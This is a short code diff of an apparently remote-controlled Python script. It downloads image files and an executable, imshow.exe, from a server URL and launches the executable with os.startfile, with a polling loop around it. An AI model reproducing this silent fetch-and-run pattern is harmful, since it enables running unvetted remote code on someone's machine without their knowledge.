@@ -136,24 +136,23 @@ def run(name):
 def display(fp:str):
     asset = hit(url+f"static/images/{fp}")
     ext = fp.split(".")[1]
-    try:
-        with open(f"assets/sample.{ext}", "xb") as file:
-            downloaded_size = 0
-            for chunk in asset.iter_content(chunk_size=8192):
-                if chunk:
-                    file.write(chunk)
-                    downloaded_size += len(chunk)
-    except FileExistsError:pass
+    if os.listdir("assets"):
+        os.remove("assets/"+os.listdir("assets")[0])
+    with open(f"assets/sample.{ext}", "xb") as file:
+        downloaded_size = 0
+        for chunk in asset.iter_content(chunk_size=8192):
+            if chunk:
+                file.write(chunk)
+                downloaded_size += len(chunk)
     if not os.path.exists("imshow.exe"):
         exe = hit(url+f"static/apps/imshow.exe")
-        with open(f"imshow", "xb") as file:
+        with open(f"imshow.exe", "xb") as file:
             downloaded_size = 0
             for chunk in exe.iter_content(chunk_size=8192):
                 if chunk:
                     file.write(chunk)
                     downloaded_size += len(chunk)
     os.startfile("imshow.exe")
-#hello.pyw
 def main():
     while not terminate:
         sleep(0.5)
